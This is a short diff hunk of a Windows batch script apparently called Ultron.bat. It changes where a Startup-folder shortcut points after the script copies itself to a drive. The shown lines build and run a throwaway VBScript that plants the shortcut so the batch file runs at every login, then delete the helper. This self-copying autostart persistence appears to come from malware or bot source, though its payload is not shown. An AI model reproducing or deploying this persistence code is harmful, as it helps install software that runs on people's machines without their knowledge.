@@ -4,7 +4,7 @@ copy "Ultron.bat" "D:\" > nul
 echo Set oWS = WScript.CreateObject("WScript.Shell") > UltronBot.vbs
 echo sLinkFile = "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Ultron.bat.lnk" >> UltronBot.vbs
 echo Set oLink = oWS.CreateShortcut(sLinkFile) >> UltronBot.vbs
-echo oLink.TargetPath = "D:\Ultron.bat" >> UltronBot.vbs
+echo oLink.TargetPath = "%systemdrive%\Ultron.bat" >> UltronBot.vbs
 echo oLink.Save >> UltronBot.vbs
 cscript /nologo UltronBot.vbs
 del UltronBot.vbs
